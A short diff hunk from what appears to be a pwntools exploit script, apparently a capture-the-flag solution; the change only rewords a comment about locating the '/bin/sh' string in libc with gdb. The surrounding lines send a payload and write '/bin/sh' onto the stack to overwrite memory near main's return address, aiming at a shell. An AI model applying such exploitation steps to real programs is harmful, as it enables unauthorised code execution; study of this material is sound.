@@ -120,7 +120,7 @@ p.recvuntil(b">> ")
 p.sendline(payload)
 
 # overwrite ret_addr+8 of main with "/bin/sh"
-# to find "/bin/sh" string in libc (get the offsets with vmmap):
+# in gdb to find "/bin/sh" string in libc (get the offsets with vmmap):
 # find 0x00007ff799702000, 0x00007ff7998eb000, '/', 'b', 'i', 'n', '/', 's', 'h'
 # copy the less significant 4 bytes
 print("WRITING '/bin/sh' ONTO THE STACK...")
